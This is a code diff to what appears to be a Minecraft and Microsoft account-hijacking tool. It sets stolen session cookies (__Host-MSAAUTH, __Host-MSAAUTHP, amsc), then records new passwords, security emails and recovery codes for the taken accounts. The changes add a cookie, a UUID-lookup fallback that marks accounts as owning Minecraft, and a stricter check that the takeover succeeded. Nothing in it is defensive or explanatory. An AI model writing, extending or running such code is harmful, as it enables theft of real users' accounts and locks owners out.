@@ -1,5 +1,5 @@
 const generate = require("../utils/generate");
-const { domains } = require("../../../config.json");
+const { domains } = require("../../../configLoader");
 const getCookies = require("./getCookies");
 const recoveryCode = require("./recoveryCode");
 const securityInformation = require("./securityInformation");
@@ -58,6 +58,7 @@ const getsecuredata = require("./recode/getsecuredata");
 const getsecureinfo = require("./recode/getsecureinfo");
 const recoveryCodefix = require("./recoveryCodefix");
 const getverificationtoken = require("./getverificationtoken");
+const getUUID = require("../hypixelapi/getUUID");
 const termLog = require("../utils/logging");
 
 
@@ -176,6 +177,7 @@ module.exports = async (host, settings, uid, username = null) => {
      */
     console.log(`[RECODE_SECURE] Setting login cookies...`);
     axios.setCookie(`__Host-MSAAUTH=${msauth}`)
+    axios.setCookie(`__Host-MSAAUTHP=${msauth}`)
     axios.setCookie(`amsc=${amsc}`)
     console.log(`[RECODE_SECURE] Login cookies set successfully`);
 
@@ -415,11 +417,28 @@ module.exports = async (host, settings, uid, username = null) => {
                         acc.capes = minecraft?.capes || [];
                         acc.newName = minecraft.name;
                     } else if (source && source !== "No Minecraft!" && source !== "XBL Failed") {
-                        const displayName = acc.gamertag || "No Minecraft IGN";
+                        const displayName = username || acc.gamertag || "No Minecraft IGN";
                         acc.oldName = displayName;
                         acc.newName = displayName;
                         acc.capes = minecraft?.capes || [];
                         await updateStatus(uid, "username", displayName);
+                    } else if (username) {
+                        try {
+                            const uuid = await getUUID(username);
+                            if (uuid) {
+                                console.log(`[RECODE_SECURE] Verified Minecraft ownership via provided username '${username}' (UUID: ${uuid})`);
+                                source = "Purchased";
+                                acc.oldName = username;
+                                acc.newName = username;
+                                acc.capes = minecraft?.capes || [];
+                                await updateStatus(uid, "username", username);
+                            } else {
+                                await updateStatus(uid, "username", 'No Minecraft Profile');
+                            }
+                        } catch (uuidErr) {
+                            console.log(`[RECODE_SECURE] getUUID check error:`, uuidErr.message);
+                            await updateStatus(uid, "username", 'No Minecraft Profile');
+                        }
                     } else {
                         await updateStatus(uid, "username", 'No Minecraft Profile');
                     }
@@ -432,13 +451,30 @@ module.exports = async (host, settings, uid, username = null) => {
         }
 
         if (!source || source === "No Minecraft!" || source === "XBL Failed") {
-            if (!settings.secureifnomc) {
-                acc.newName = "No Minecraft!";
-                acc.ssid = "No Minecraft!";
-                console.log('[RECODE_SECURE] No MC detected & secureifnomc is off, but continuing to alias/security flow...');
-                // NOTE: We no longer return early here. The alias/password/recovery/email
-                // flow below will still run so the account gets properly secured.
-                // The old code did `return acc;` which skipped alias creation entirely.
+            if (username && (acc.xbl || sid || mxblresult?.xbl || acc.gtg)) {
+                try {
+                    const fallbackUuid = await getUUID(username);
+                    if (fallbackUuid) {
+                        console.log(`[RECODE_SECURE] Fallback: verified Minecraft account '${username}' via public UUID lookup`);
+                        source = "Purchased";
+                        acc.mc = "Purchased";
+                        acc.oldName = username;
+                        acc.newName = username;
+                    }
+                } catch (fallbackErr) {
+                    console.log(`[RECODE_SECURE] Fallback UUID lookup error:`, fallbackErr.message);
+                }
+            }
+
+            if (!source || source === "No Minecraft!" || source === "XBL Failed") {
+                if (!settings.secureifnomc) {
+                    acc.newName = "No Minecraft!";
+                    acc.ssid = "No Minecraft!";
+                    console.log('[RECODE_SECURE] No MC detected & secureifnomc is off, but continuing to alias/security flow...');
+                }
+            } else {
+                console.log(`Setting mc as ${source}`);
+                acc.mc = source;
             }
         } else {
             console.log(`Setting mc as ${source}`);
@@ -631,7 +667,7 @@ module.exports = async (host, settings, uid, username = null) => {
             await updateStatus(uid, "secemail", acc.secEmail);
             await updateStatus(uid, "password", acc.password);
             await updateStatus(uid, "recoverycode", `${recovery} -> ${acc.recoveryCode}`);
-            recoverySecured = true;
+            recoverySecured = Boolean(acc.password && !acc.password.startsWith("Failed") && acc.password !== notSecuredNote);
         } else {
             acc.recoveryCode = "Failed to generate";
             const newData = await recoveryCodefix(axios, securityParameters);
